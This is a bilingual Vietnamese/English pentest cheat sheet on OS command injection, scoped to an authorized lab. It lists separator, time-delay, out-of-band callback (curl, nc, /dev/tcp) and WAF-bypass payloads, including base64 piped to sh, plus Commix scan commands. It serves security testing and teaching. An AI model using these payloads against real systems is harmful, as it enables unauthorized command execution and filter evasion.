# 6. Command Injection (OS Injection)

> [!CAUTION]
> Chỉ dùng trong lab local hoặc hệ thống có ủy quyền rõ ràng. Payload có risk `destructive`, `dos` hoặc `oob` phải chạy trong fixture cô lập, có giới hạn tài nguyên và không có outbound network.

> **Phạm vi kiểm chứng:** Nội dung và payload vẫn ở mức technical review. `static-verified` chỉ xác nhận annotation và kiểm tra tĩnh trong đúng context/version đã ghi; không phải lab evidence và không cho phép sử dụng ngoài phạm vi được ủy quyền.

Command Injection xảy ra khi đầu vào của người dùng được nối trực tiếp vào các hàm thực thi lệnh hệ điều hành của máy chủ mà không được làm sạch, cho phép thực thi mã tùy ý.

### 6.1. Active Command Injection (Direct Output)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Xuất hiện khi ứng dụng thực thi một lệnh hệ điều hành và hiển thị trực tiếp toàn bộ kết quả stdout/stderr lên giao diện trang web.
    *   *English*: Command execution stdout/stderr is returned directly in the application web response.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Nhập các ký tự nối lệnh như `;`, `|`, `&`, `&&`, `||` tiếp sau bằng lệnh kiểm tra (`id`, `whoami`).
    *   *English*: Test parameter values with metacharacters like `;`, `|`, `&`, `&&`, `||` followed by probe commands.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-06-001 -->
<!-- context: Bash 5.2 invoked by a PHP 8.2 command-wrapper fixture in an Ubuntu 22.04 disposable container; user input occupies one shell argument; case: 6.1. Active Command Injection (Direct Output) -->
<!-- prerequisites: use a non-root container with a synthetic working directory, local callback recorder and command timeout; run one probe at a time and discard filesystem changes -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the vulnerable wrapper prints the harmless command identity/marker; the argument-vector implementation treats separators as literal data -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
```
; id                                                 # Terminates command and executes id (Linux)
& id                                                 # Backgrounds execution and runs id (Linux/Windows)
&& id                                                # Runs id if the first command succeeds (Linux/Windows)
| id                                                 # Pipes input to id (Linux/Windows)
|| id                                                # Runs id if the first command fails (Linux/Windows)
%0aid                                                # Hex encoded newline separator execution (Linux)
`id`                                                 # Inlined backtick command evaluation (Linux)
$(id)                                                # Inline subshell command execution (Linux)
& whoami                                             # CMD command concatenation (Windows)
; printf$IFS'SECHUB_CMD_PROBE'                          # Harmless marker using IFS as a space substitute
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Commix để quét tự động phát hiện và khai thác Active Command Injection.
    *   *English*: Use Commix tool to automatically scan, identify, and exploit active command injection points.
<!-- payload-id: CHEAT-06-002 -->
<!-- context: Bash 5.2 invoked by a PHP 8.2 command-wrapper fixture in an Ubuntu 22.04 disposable container; user input occupies one shell argument; case: 6.1. Active Command Injection (Direct Output) -->
<!-- prerequisites: use a non-root container with a synthetic working directory, local callback recorder and command timeout; run one probe at a time and discard filesystem changes -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the vulnerable wrapper prints the harmless command identity/marker; the argument-vector implementation treats separators as literal data; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    commix --url="http://victim.lab.test/cmd.php?addr=127.0.0.1" --batch
    ```


---

### 6.2. Blind Time-based Command Injection
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Ứng dụng thực thi lệnh hệ điều hành nhưng kết quả stdout không hiển thị lên màn hình hoặc phản hồi HTTP.
    *   *English*: Command is executed but output is hidden. Detection must be performed via processing time delays.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Chèn lệnh gây trễ hệ thống như `sleep 5` hoặc `timeout 5` và kiểm tra xem thời gian phản hồi của máy chủ có tăng lên không.
    *   *English*: Inject time delay commands (`sleep 5`) and measure server latency.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-06-003 -->
<!-- context: Bash 5.2 invoked by a PHP 8.2 command-wrapper fixture in an Ubuntu 22.04 disposable container; user input occupies one shell argument; case: 6.2. Blind Time-based Command Injection -->
<!-- prerequisites: use a non-root container with a synthetic working directory, local callback recorder and command timeout; run one probe at a time and discard filesystem changes -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: one request adds the bounded five-second delay in the vulnerable shell wrapper; the fixed argument-vector call remains at baseline latency -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
```
; sleep 5                                            # Suspends execution for 5 seconds (Linux)
&& sleep 5                                           # Delay if preceding command succeeds (Linux)
|| sleep 5                                           # Delay if preceding command fails (Linux)
$(sleep 5)                                           # Inline time-based delay (Linux)
& sleep 5 &                                          # Background delay call (Linux)
& timeout 5                                          # Suspends execution using Windows timeout (Windows)
& ping -n 6 127.0.0.1                                # Windows fallback delay using ping loop (Windows)
; Start-Sleep -s 5                                   # PowerShell sleep delay (Windows)
; test -f /tmp/sechub-lab/marker && sleep 5           # Bounded fixture-only conditional delay
;sleep$IFS''5                                        #  Time delay utilizing space substitute to bypass space filters and WAF rules.
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Cấu hình Commix chạy ở chế độ Blind Time-based.
    *   *English*: Run Commix in blind time-based detection mode to exploit hidden targets.
<!-- payload-id: CHEAT-06-004 -->
<!-- context: Bash 5.2 invoked by a PHP 8.2 command-wrapper fixture in an Ubuntu 22.04 disposable container; user input occupies one shell argument; case: 6.2. Blind Time-based Command Injection -->
<!-- prerequisites: use a non-root container with a synthetic working directory, local callback recorder and command timeout; run one probe at a time and discard filesystem changes -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: one request adds the bounded five-second delay in the vulnerable shell wrapper; the fixed argument-vector call remains at baseline latency; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    commix --url="http://victim.lab.test/cmd.php?addr=127.0.0.1" --technique=T --batch
    ```


---

### 6.3. Blind Out-of-Band (OOB) Command Injection
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Ứng dụng thực thi lệnh ngầm và máy chủ mục tiêu có kết nối mạng ra bên ngoài (egress connections).
    *   *English*: Command is executed silently, and the target server permits outgoing network connections.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Chèn lệnh gọi về máy chủ DNS/HTTP OOB (như `nslookup`, `curl`) để kiểm tra xem có kết nối mạng gọi ngược về không.
    *   *English*: Inject command callbacks (`curl`, `nslookup`) pointing to your OOB listener domain.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-06-005 -->
<!-- context: Bash 5.2 invoked by a PHP 8.2 command-wrapper fixture in an Ubuntu 22.04 disposable container; user input occupies one shell argument; case: 6.3. Blind Out-of-Band (OOB) Command Injection -->
<!-- prerequisites: use a non-root container with a synthetic working directory, local callback recorder and command timeout; run one probe at a time and discard filesystem changes -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the vulnerable wrapper creates one DNS/HTTP event on the loopback callback recorder; the fixed wrapper creates no callback -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
```
; curl -fsS http://callback.lab.test/SECHUB                # Loopback HTTP marker
; wget -qO- http://callback.lab.test/SECHUB                 # Alternative loopback HTTP marker
; nslookup SECHUB.callback.lab.test                         # Loopback DNS marker
; dig SECHUB.callback.lab.test                              # Alternative loopback DNS marker
; ping -c 1 callback.lab.test                               # One bounded loopback ICMP probe
; nc -z -w 1 callback.lab.test 18081                        # Bounded TCP connect probe; no shell
; printf SECHUB >/dev/tcp/callback.lab.test/18081           # Fixed marker to local TCP recorder
; Invoke-WebRequest -Method Head http://callback.lab.test/SECHUB # PowerShell loopback HEAD request
& curl.exe -I http://callback.lab.test/SECHUB               # Windows loopback HEAD request
;curl$IFS-fsS$IFS'http://callback.lab.test/SECHUB'           # IFS variant with a fixed marker
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Commix cấu hình `--oob-server` để bắt các callback tự động.
    *   *English*: Use Commix with `--oob-server` parameter to capture automatic reverse connection signals.
<!-- payload-id: CHEAT-06-006 -->
<!-- context: Bash 5.2 invoked by a PHP 8.2 command-wrapper fixture in an Ubuntu 22.04 disposable container; user input occupies one shell argument; case: 6.3. Blind Out-of-Band (OOB) Command Injection -->
<!-- prerequisites: use a non-root container with a synthetic working directory, local callback recorder and command timeout; run one probe at a time and discard filesystem changes -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the vulnerable wrapper creates one DNS/HTTP event on the loopback callback recorder; the fixed wrapper creates no callback; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    commix --url="http://victim.lab.test/cmd.php?addr=127.0.0.1" --dns-domain="callback.lab.test"
    ```


---

### 6.4. Filter Bypass & WAF Bypass (WAF Bypass Payload included)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Các ký tự nối lệnh cơ bản (như dấu cách, dấu chấm phẩy) hoặc các từ khóa bị tường lửa chặn và báo lỗi 403.
    *   *English*: Traversal elements (spaces, semicolons) or command signatures are blocked by filtering rules.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thử sử dụng biến môi trường `$IFS`, dấu ngoặc nhọn `{}` hoặc mã hóa Base64 để vượt qua bộ lọc.
    *   *English*: Test path separators alternative structures, brace expansion, or Base64 decoding string pipelines.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-06-007 -->
<!-- context: Bash 5.2 invoked by a PHP 8.2 command-wrapper fixture in an Ubuntu 22.04 disposable container; user input occupies one shell argument; case: 6.4. Filter Bypass & WAF Bypass (WAF Bypass Payload included) -->
<!-- prerequisites: use a non-root container with a synthetic working directory, local callback recorder and command timeout; run one probe at a time and discard filesystem changes -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: exactly one decode/normalization path reaches the synthetic file marker in the vulnerable fixture; canonical containment blocks every encoded variant -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
```
;printf$IFS'SECHUB_CMD_PROBE'                        # IFS space substitute
;{printf,SECHUB_CMD_PROBE}                           # Bash brace expansion
;p'r'intf SECHUB_CMD_PROBE                           # Quote-separated keyword
;a=pri;b=ntf;$a$b SECHUB_CMD_PROBE                   # Variable-built command
;echo -e "\x70\x72\x69\x6e\x74\x66\x20\x53\x45\x43\x48\x55\x42" | bash # Encoded harmless marker
;echo "cHJpbnRmIFNFQ0hVQg==" | base64 -d | sh        # Base64 harmless marker
& powershell -Command "Write-Output SECHUB_CMD_PROBE" # Windows marker without file/network access
;printf SECHUB?CMD?PROBE                             # Glob interpretation in synthetic directory only
;${PATH:0:1}usr${PATH:0:1}bin${PATH:0:1}printf SECHUB # Dynamic path separators, harmless output
;$(echo{printf,SECHUB_CMD_PROBE})                    # Combined brace and subshell marker
```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Commix kết hợp với các tamper script để tự động hóa việc vượt bộ lọc của WAF.
    *   *English*: Configure Commix with custom tamper scripts to bypass signature checking.
<!-- payload-id: CHEAT-06-008 -->
<!-- context: Bash 5.2 invoked by a PHP 8.2 command-wrapper fixture in an Ubuntu 22.04 disposable container; user input occupies one shell argument; case: 6.4. Filter Bypass & WAF Bypass (WAF Bypass Payload included) -->
<!-- prerequisites: use a non-root container with a synthetic working directory, local callback recorder and command timeout; run one probe at a time and discard filesystem changes -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: exactly one decode/normalization path reaches the synthetic file marker in the vulnerable fixture; canonical containment blocks every encoded variant; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    commix --url="http://victim.lab.test/cmd.php?addr=127.0.0.1" --tamper="base64encode" --batch
    ```

---

## Tài liệu tham khảo

- **[S1]** OWASP OS Command Injection Defense Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html — bản hiện hành; truy cập: 2026-07-18.
- **[S2]** PortSwigger Web Security Academy — OS command injection. https://portswigger.net/web-security/os-command-injection — bản hiện hành; truy cập: 2026-07-18.
